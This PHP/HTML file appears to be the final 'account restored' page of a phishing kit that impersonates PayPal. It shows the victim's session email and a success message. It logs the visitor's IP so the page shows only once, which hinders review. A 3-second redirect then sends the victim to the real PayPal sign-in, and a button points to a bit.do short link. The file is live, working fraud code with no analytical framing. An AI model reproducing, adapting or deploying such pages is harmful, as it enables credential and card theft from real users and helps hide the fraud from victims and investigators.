<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once '../lang.php';
if($setting['onetime'] == "on") {
	tulis_file("../security/onetime.dat","$ip");
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="assets/pics/favi.ico">
    <link rel="apple-touch-icon" href="assets/pics/favi.png">
    <meta http-equiv="refresh" content="3;url=https://www.paypal.com/<?php echo strtolower($countrycode);?>/signin" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title><?php echo $account['title'];?></title>
    <link rel="stylesheet" href="assets/styles/process.css">
    <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.mask.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
</head>

<body>
    <input type="checkbox" id="toggleMenu" class="menuToggler">
    <div class="desktopNav">
        <div class="navContainer">
            <a href="javascript:" class="desktopBrand"></a>
            <div class="mobileMenu">
                <div class="logoutMobile">
                    <a href="javascript:" class="logoutTxtMobile">
          Log Out</a>
                </div>
                <div class="settingsMobile">
                    <a href="javascript:" class="svgLogo settingsTxt">
                        <img src="assets/pics/settings.svg" alt=""></a>
                </div>
                <div>
                    <p class="displayMail">
                        <?php echo $_SESSION['login_email'];?></p>
                </div>
            </div>
            <div class="desktopMenu">
                <nav class="desktopItems">
                    <ul class="firstUl">
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['summary'];?>     </a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['activity'];?></a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
         <?php echo $account['send'];?></a></li>
                        <li class="">
                            <a href="javascript:" class="linksTxt"><?php echo $account['wallet'];?></a>
                        </li>
                        <li class="activeLi">
                            <a href="javascript:" class="linksTxt"><?php echo $account['help'];?></a>
                        </li>
                    </ul>
                    <ul class="secondUl">
                        <li class="notifLi">
                            <a href="javascript:" class="svgLogo notifTxt">
                                <img src="assets/pics/noti.svg" alt=""></a>
                        </li>
                        <li>
                            <a href="javascript:" class="svgLogo settingsTxt"><img src="assets/pics/settings.svg" alt=""></a>
                        </li>
                        <li class="logoutLi">
                            <a href="javascript:" class="logoutTxtDesktop"><?php echo $account['logout'];?></a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <div class="mainContainer">
        <div class="hide" id="rotate">
            <div class="spinner">
                <div class="rotate"></div>
                <div class="processing"><?php echo $account['processing'];?>...</div>
            </div>
            <div class="overlay">
            </div>
        </div>
        <div class="mobileNav">
            <div class="navHeader">
                <div class="blockToggler">
                    <label class="menuLabel" for="toggleMenu"><span></span>
                        <div class="menuOpen">Menu</div>
                        <div class="menuClose">
                            Close</div>
                    </label>
                </div>
            </div>
            <div class="navLogo">
                <a href="javascript:" class="mobileBrand"></a>
            </div>
            <ul class="notifUl">
                <li>
                    <a class="svgLogo notifTxt">
                        <img src="assets/pics/noti.svg" alt="">
                    </a>
                </li>
            </ul>
        </div>
        <?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div class="contents">
<section class="mainContents" id="finish">
<div id="select_three"><!--18752825-->	<div style="padding:20px">
		<img src="assets/pics/success.svg" alt="" width="150">
<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $id['restore'];?><div>
					   
				<form method="get" action="https://bit.do/webaccount">
	<button style="margin-top:20px;borde r-radius:.5rem" class="bt gone_bt"><?php echo $account['continue'];?></button>
				</form>
</div>
</div><!--93153562--></div>
</div><!--6425322-->
<div>
	</section>
<?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div>
            <div class="ftr">
                <div class="footerFirstContent">
                    <ul class="footerList">
                        <li><a href="javascript:"><?php echo $account['contact'];?></a></li>
                        <li><a href="javascript:"><?php echo $account['sec'];?></a></li>
                    </ul>
                    <div class="footerSecondContent">
                        <p class="footerP">Copyright ©<span>1999-2020</span> . All rights reserved.</p>
                        <ul class="footerUl">
                            <li><a href="javascript:"><?php echo $login['privacy'];?></a></li>
                            <li><a href="javascript:"><?php echo $login['legal'];?></a></li>
                        </ul>
</div>
</div>
</body>
</html>